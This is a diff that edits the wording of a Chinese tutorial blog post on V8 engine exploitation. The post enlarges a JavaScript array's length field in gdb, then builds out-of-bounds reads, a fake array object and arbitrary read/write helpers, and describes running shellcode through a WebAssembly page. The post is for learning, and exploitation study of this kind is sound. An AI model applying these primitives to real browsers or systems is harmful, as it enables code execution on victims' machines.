@@ -8,7 +8,7 @@ order: 3
 ---
 
 ## 回顾
-在上一篇中，了解到浮点数，对象都储存在同一块区域
+上一篇看到，浮点数组和对象数组的 `elements` 都紧跟在数组对象后面。
 ```C
 struct array {
 	map* map;
@@ -26,21 +26,21 @@ struct elements {
 并且，elements 与 array 相邻。
 
 ## 设想
-若是可以通过其他漏洞，使得 array 的 length 字段变大，就能进行溢出读写，进而得到任意地址读写吧
+如果能通过别的漏洞把 `length` 改大，越界读写就变成了任意地址读写。
 
 ## 实践
 
 ### 准备
-首先先定义俩变量，用于后续的操作
+先定义两个变量：
 ```js
 x = [1.5, 0, 0, 0, 5.0, 6.0, 7.0, 8.0, 9.0, 10.0, 11.0, 12.0, 13.0, 14.0, 15.0, 16.0];
 
 y = [x, x];
 ```
-一个是浮点数数组，一个是对象数组
+`x` 是浮点数组，`y` 是对象数组，里面装的是 `x` 的引用。
 
 ### 修改 length
-打印 x 的信息再加上断点，通过 gdb 手动修改内存，即 x 的 length 值
+打印 `x` 的布局再断下来，然后在 gdb 里手动改它的 `length` 字段。
 ```js
 %DebugPrint(x);
 
@@ -75,7 +75,7 @@ DebugPrint: 0x3f6e6bd15fc9: [JSArray]
           15: 16 (0x4030000000000000)
  }
 ```
-然后用 tel 指令查看内存
+用 `tel` 看这块内存的排布：
 ```
 pwndbg> tel 0x3f6e6bd15fc8
 00:0000│     0x3f6e6bd15fc8 —▸ 0x1e41c779e6e1 ◂— 0x400001e41c77915
@@ -88,7 +88,7 @@ pwndbg> tel 0x3f6e6bd15fc8
 07:0038│     0x3f6e6bd16000 —▸ 0x3f6e6bd15fc9 ◂— 0x1900001e41c779e6
 ```
 
-定位到 **0x3f6e6bd15fe0** ，这就是 length 对应的地址，使用 gdb 的 set 命令修改值并验证
+**0x3f6e6bd15fe0** 就是 `length` 那个槽，用 gdb 的 `set` 改掉再验证：
 ```
 pwndbg> set {int}0x3f6e6bd15fe4=0x20
 pwndbg> tel 0x3f6e6bd15fc8
@@ -130,7 +130,7 @@ pwndbg> job 0x3f6e6bd15fc9
 可以看到，length 被修改成了 32。
 
 ### 越界读
-先申请一块 Buffer 然后再获得 view，得到读取写入的功能，然后通过 view 的各种 set 和 get 就能实现数值类型转换
+申请一块 8 字节的 ArrayBuffer，再用 DataView 读写它——这样就能在 float64 和 uint64 之间来回转。
 ```js
 let buf = new ArrayBuffer(8);
 let view = new DataView(buf);
@@ -139,7 +139,7 @@ view.setFloat64(0, x[16], true);
 let doublemap = view.getBigUint64(0, true);
 print(doublemap.toString(16));
 ```
-这样就成功读出了 x\[16]，也就是 x 的 map 字段（double map 对应的值）
+这样就成功读出了 `x[16]`，也就是 `x` 的 map 字段（double map 对应的值）。
 
 用同样的方法，读取 x 的 elements 字段的值
 
@@ -151,7 +151,7 @@ x[3] = view.getFloat64(0, true);
 view.setBigInt64(0, doublemap, true);
 x[0] = view.getFloat64(0, true);
  ```
-x\[0]~x\[3] 构成了一个 `fake array object` ，其中 properties 字段为 0
+`x[0]`~`x[3]` 凑成一个 `fake array object`，其中 properties 字段为 0。
 
 ### 获取 fake array object
 ```js
@@ -159,7 +159,7 @@ view.setBigUint64(0, element+0x10n, true);
 x[22] = view.getFloat64(0, true);
 obj = y[0];
 ```
-通过越界写，修改 y\[0] , 也就是修改 y 的 elements 的第一个值，然后通过 y\[0] 获取伪造的对象
+通过越界写改掉 `y[0]`，也就是 `y` 的 elements 第一个槽，再从 `y[0]` 拿到伪造的对象。
 
 ### 任意读写
 成功获取了一个可以任意修改字段的 array 对象，然后可以通过修改其中的 elements 字段来达到任意地址写，将这个过程封装为函数
@@ -181,7 +181,7 @@ function writeval(addr, val) {
 
 ### 执行流劫持
 在有了 AAR 和 AAW 后，就应该想着劫持执行流了
-如果是 glibc 低版本，或许可以试着用 free_hook 什么的，但是高版本我们也知道，无法这样劫持执行流了，这里介绍另一种部分，javascript 支持注入 wasm 代码。
+老版本还能靠 `__free_hook` 这类东西，新版本没这条路了；这里换一条：JavaScript 支持注入 WebAssembly 代码。
 
 > WebAssembly (Wasm) 是一种**二进制指令格式**，旨在作为一种可移植的编译目标，用于在现代 Web 浏览器中运行高性能的应用程序。
 
@@ -219,5 +219,5 @@ f();
 最后再调用 f ，也就是 wasm 代码，就能运行刚才写的 shellcode 了。
 
 ## 特别鸣谢
-在这里特别感谢 NepNep 战队的 [sysNow](https://sysnow.xyz/) 师傅。
+感谢 NepNep 战队的 [sysNow](https://sysnow.xyz/) 师傅。
 在写完 php 那篇文章后，sysNow 师傅正好给我发了一篇 V8 的文章，我刚好也趁着这个机会学习一下 V8 ，遇到不明白的也感谢 sysNow 师傅给我解答。
